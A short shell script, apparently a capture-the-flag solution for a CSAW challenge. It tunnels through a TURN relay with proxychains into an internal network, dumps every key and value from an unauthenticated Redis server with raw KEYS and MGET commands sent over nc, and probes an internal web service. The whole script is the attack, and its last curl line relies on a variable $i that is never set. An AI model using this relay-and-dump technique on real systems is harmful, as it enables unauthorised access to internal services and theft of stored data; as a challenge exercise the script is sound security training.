#!/bin/sh

./turner -server web.chal.csaw.io:3478 2>&1 | grep channel &
A=$!
sleep 0.25
REDISRES="$(echo -ne '*2\r\n$4\r\nKEYS\r\n$1\r\n*\r\n' | proxychains nc 172.17.0.3 6379)"
NUMARGS=$(("`echo $REDISRES | grep '\*' | tr -d '*'`" + 1))
ARGS="`echo $REDISRES | grep '\$' -A1`"
echo -ne "*$NUMARGS\r\n\$4\r\nMGET\r\n$ARGS" | proxychains nc 172.17.0.3 6379
proxychains curl 172.17.0.$i:5000
kill $A &>/dev/null
sleep 0.25
